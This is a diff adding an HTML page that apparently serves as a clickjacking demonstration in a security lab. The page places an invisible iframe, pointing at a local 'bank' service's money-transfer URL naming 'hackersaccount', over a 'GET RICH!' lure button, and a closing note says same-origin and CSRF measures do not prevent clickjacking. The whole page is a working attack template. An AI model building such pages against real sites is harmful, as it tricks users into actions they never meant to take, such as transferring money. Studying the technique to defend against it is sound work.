@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <link href="/stylesheets/bootstrap.min.css" rel="stylesheet"/>
+    <style>
+        iframe { /* iframe from the victim site */
+            width: calc(100vw - 100px);
+            height: calc(100vh - 100px);;
+            position: absolute;
+            top: 0;
+            left: -20px;
+            opacity: 0;
+            z-index: 1;
+        }
+        h1 {
+            padding-top: 250px;
+            text-align: center;
+        }
+        input[type=button] {
+            margin-left: 10vw;
+            width: calc(100vw - 300px);
+            height: 200px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Click below get rich now!</h1>
+<!-- The url from the victim site -->
+<iframe src="http://bank:3002/sendMoney?account=hackersaccount&amount=100"></iframe>
+<input type="button" class="btn btn-success" value="GET RICH!"></input>
+<div> it's also worth to know that not using cookies. Having sop/csr don't prevent clickjackign
+</div>
+</body>
+</html>
